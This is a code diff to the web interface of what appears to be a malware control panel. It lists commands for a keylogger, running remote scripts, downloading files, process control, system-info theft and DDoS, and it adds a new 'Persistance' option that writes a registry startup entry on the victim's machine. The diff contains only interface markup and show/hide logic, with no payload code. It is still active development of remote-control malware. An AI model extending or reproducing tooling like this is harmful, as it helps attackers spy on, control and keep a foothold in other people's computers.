@@ -56,14 +56,15 @@
                             <option value="jigglecursorstop">Stop Jiggle Cursor</option>
                             <option value="systeminfo">Grab System Info</option>
                             <option value="stress">Stress CPU</option>
-                            <option value="ddos">DDos Website</option>
-                            <option value="attack">DDos IP</option>
+                            <!-- <option value="ddos">DDos Website</option>
+                            <option value="attack">DDos IP</option> -->
                             <option value="keylogger">Keylogger</option>
                             <option value="runscript">Run Script</option>
                             <option value="download">Download File</option>
                             <option value="scanfiles">Scan Files</option>
                             <option value="processcontrol">Process Control</option>
                             <option value="stopprocessscontrol">Stop Process Control</option>
+                            <option value="persistance">Persistance</option>
                         </select>
 
                         <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
@@ -151,6 +152,11 @@
                     <!-- Scan PC Files -->
                     <div class="desc-box" id="desc-input-needed-scanfiles" style="display: none;">
                         <h3>Scan C drive for any files named with your input (seperate filenames with a space)</h3> 
+                    </div>
+
+                    <!-- Persistance -->
+                    <div class="desc-box" id="desc-input-needed-persistance" style="display: none;">
+                        <h3>Set persistance to the client (add to startup)</h3> 
                     </div>
                 </div>
 
@@ -330,6 +336,16 @@
                             <span class="highlight"></span>
                             <span class="bar"></span>
                             <label>Processes To Block</label>
+                        </div> 
+                    </div>
+
+                    <!-- Persistance -->
+                    <div id="input-needed-persistance" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="persistance-name" id="process-name" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Persistance Registry Name</label>
                         </div> 
                     </div>
                 </div>
@@ -583,6 +599,15 @@ function commandCheck(command) {
     } else {
         document.getElementById("input-needed-scanfiles").style.display = "none";
         document.getElementById("desc-input-needed-scanfiles").style.display = "none";
+    }
+
+    /* Persistance */
+    if (command.value == "persistance") {
+        document.getElementById("input-needed-persistance").style.display = "block";
+        document.getElementById("desc-input-needed-persistance").style.display = "block";
+    } else {
+        document.getElementById("input-needed-persistance").style.display = "none";
+        document.getElementById("desc-input-needed-persistance").style.display = "none";
     }
 }
 </script>
